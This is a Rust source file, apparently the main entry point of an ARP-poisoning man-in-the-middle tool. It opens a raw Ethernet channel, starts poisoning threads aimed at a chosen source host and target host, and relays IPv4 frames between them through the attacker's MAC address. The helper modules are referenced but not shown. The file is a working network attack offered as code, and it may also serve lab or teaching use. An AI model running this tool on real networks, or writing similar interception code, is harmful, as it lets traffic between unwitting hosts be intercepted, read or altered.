use std::sync::{Arc, Mutex};

use pnet::{
    datalink::{self, Channel::Ethernet},
    packet::ethernet::{EtherTypes, EthernetPacket},
};

use crate::{forward_ipv4::forward_ipv4_packet, handle_arp::start_poison_thread, parse_args::Args};

mod forward_ipv4;
mod handle_arp;
mod parse_args;

fn main() {
    let args = Args::new();
    args.verify_args();

    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|iface| iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty())
        .expect("No suitable network interface found");

    let attacker_mac = interface.mac.unwrap_or_else(|| {
        eprintln!("Error while retrieving attacker mac");
        std::process::exit(1);
    });

    let (tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            eprintln!("Error: Unsupported channel type");
            std::process::exit(1);
        }
        Err(e) => {
            eprintln!("Error creating datalink channel: {e}");
            std::process::exit(1);
        }
    };

    let tx = Arc::new(Mutex::new(tx));

    start_poison_thread(
        tx.clone(),
        attacker_mac,
        args.ip_src,
        args.mac_src,
        args.ip_target,
    );

    start_poison_thread(
        tx.clone(),
        attacker_mac,
        args.ip_target,
        args.mac_target,
        args.ip_src,
    );

    loop {
        match rx.next() {
            Ok(packet) => {
                if let Some(eth) = EthernetPacket::new(packet) {
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if eth.get_source() == args.mac_src {
                            forward_ipv4_packet(&eth, tx.clone(), attacker_mac, args.mac_target);
                        } else if eth.get_source() == args.mac_target {
                            forward_ipv4_packet(&eth, tx.clone(), attacker_mac, args.mac_src);
                        }
                    }
                }
            }
            Err(e) => eprintln!("rx error: {e}"),
        }
    }
}
